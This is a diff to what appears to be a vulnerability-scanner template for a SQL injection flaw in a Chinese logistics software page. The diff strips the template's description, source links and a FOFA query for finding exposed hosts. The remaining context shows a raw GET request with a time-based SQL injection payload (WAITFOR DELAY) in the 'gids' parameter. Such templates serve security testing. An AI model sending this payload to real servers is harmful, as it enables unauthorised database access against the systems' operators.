@@ -3,12 +3,8 @@ info:
   name: 东胜物流软件WmsLCLInfoGridSource.aspx存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/iuhro4uk9l8oxd8h'
+  description: ''
   tags: rce,sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: iuhro4uk9l8oxd8h
-    fofa: body="CompanysAdapter.aspx"
 http:
 - raw:
   - 'GET /SeaiInfoLCL/WmsLCLInfoGridSource.aspx?read=isout&gids=-1%27)%3BWAITFOR+DELAY+%270%3A0%3A5%27--+ HTTP/1.1
